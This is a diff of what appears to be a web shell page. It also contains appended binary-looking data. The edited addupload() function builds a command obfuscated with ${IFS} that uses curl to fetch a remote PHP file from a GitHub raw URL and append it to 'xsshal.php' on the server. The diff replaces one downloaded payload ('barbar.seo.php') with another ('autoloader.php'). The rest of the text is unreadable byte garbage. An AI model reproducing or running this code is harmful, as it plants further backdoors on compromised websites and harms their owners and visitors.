@@ -21,7 +21,7 @@ function nezcmd()
 
 function addupload()
 {
-	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"curl${IFS}-Ls${IFS}"https://raw.githubusercontent.com/YahahaKayu/Tsts/main/barbar.seo.php$"{IFS}|${IFS}tee${IFS}-a${IFS}xsshal.php";
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"curl${IFS}-Ls${IFS}"https://raw.githubusercontent.com/seokerens/umum/refs/heads/main/autoloader.php$"{IFS}|${IFS}tee${IFS}-a${IFS}xsshal.php";
 }
 </script>
 <style type="text/css">
@@ -220,4 +220,5 @@ m¥¦<£fk.å6‹‡w@ËæÛ~²ý¦ØïÝ%Nôº´ÞLku½êZ¹æ:©ÿ c…B
 ÑÙÚ0ÑÍZ›Ú&è
 ë|?U³†Ÿë˜T²4Ù»ÖûM§Éî*‡®³KöÖ ‹UëCˆicW¤ýÖÈÍ”€s ùGíÁÌIB‚…7zºâ[d¢ª-_5c)â÷«oÄ+‘Ÿq#î¥¯,¶,7ÇÄT­©êÇ¡b.¹vÈ±0Œ&ùH0Ø¶R ¢ôañÃ0á#wÒ3#I?q¼_Ðe+è}H|IO„×"m}‰bTP z¼Ö=É ªù¤òu¼wVâå¹ÑÕÍóV±ï Ïfâ85é³h
 VG"Ûä^·:ý¬•¯PT`Wªhuƒƒ´X@=qÈ4uÚ¡y{ÃôQwë[½b7-uNS÷ÌÐ Mx´FÆ^³$p»Ñá˜­è4^s?@üÆ©M ºÅìØ…š±.¬K90í)qa3´0iÛ&¥z‹¦ÕfÔŒëŠ†_ø: ºÂhC VüMYj*^Éd@áhÛK96K`_—aõ—Jzn?X@IÌêÊ¶+Æyíp@h]Æ[Š:+Çh›•D
+
 ,&üª,‚TÇ½±H¯SîGœ¦²Ò]P‘àŠžÚžl|b¢9+ž‘B&òëq ¶9šïoCÖ$_µ²Ï2£7À Z2â¶¢ÎÍúÃH$Ð7Ö:ýÃÏè[.\²Y.\²-ã5Þ_)rë›/…Ë—,—,–K%Ö’å’åË–ÿ 5þ 9Î<9ÿ AÿÙ
